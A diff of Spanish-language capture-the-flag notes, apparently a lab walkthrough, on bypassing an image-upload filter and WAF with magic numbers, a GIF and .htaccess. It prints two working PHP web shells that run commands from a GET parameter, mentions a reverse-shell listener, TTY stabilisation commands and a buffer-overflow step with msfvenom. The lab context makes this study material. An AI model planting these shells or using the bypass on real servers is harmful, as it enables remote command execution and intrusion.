@@ -375,6 +375,7 @@ uploadr942.php como URL de imfadministrator
 ![[Pasted image 20251106033350.png]]
 
 
+https://stackoverflow.com/questions/23714383/what-are-all-the-possible-values-for-http-content-type-header
 
 se pueden subir imagenes
 
@@ -383,14 +384,33 @@ los gif se pueden abrir
 insertamos este payload para eludir el WAF
 magic numbers
 
+![[Pasted image 20251115023959.png]]
 
+
+CREAR UNA FUNCION CON LOGICA
+```
 <?php
 $f = 'sy'.'stem';
-$f($_GET['cmd']);
+	$f($_GET['cmd']);
 ?>
+```
 
+COMILLA INVERTIRA
+```
+<?php
+$command=$_GET['cmd'];
+	echo `$command`;
+?> 
+```
 
 htaccess con php en gif
+
+hice ls y cat con curl a 
+```
+flag5{YWdlbnRzZXJ2aWNlcw==}
+```
+
+
 
 nos ponemos en escucha
 
@@ -401,6 +421,39 @@ usamos el payload
 el & es un carade nalgas entonces nos toca URL encodearlo con %26
 
 y logramos conexion 
+
+
+#### Estabilización de TTY
+
+Comandos para estabilizar la shell:
+```
+/usr/bin/script -qc /bin/bash /dev/null
+```
+Luego CTRL+Z y ejecutar:
+```
+stty raw -echo; fg
+```
+Finalmente:
+```
+export TERM=xterm
+```
+
+ecnontramos agent gracias a la pista de flag
+
+hay un binario,
+
+aplicamos ltrace para ver recorrido,
+
+comparamos
+
+buffer over flow
+
+mvfvenom para crear payload
+
+script de python con socket
+
+
+
 
 ---
 
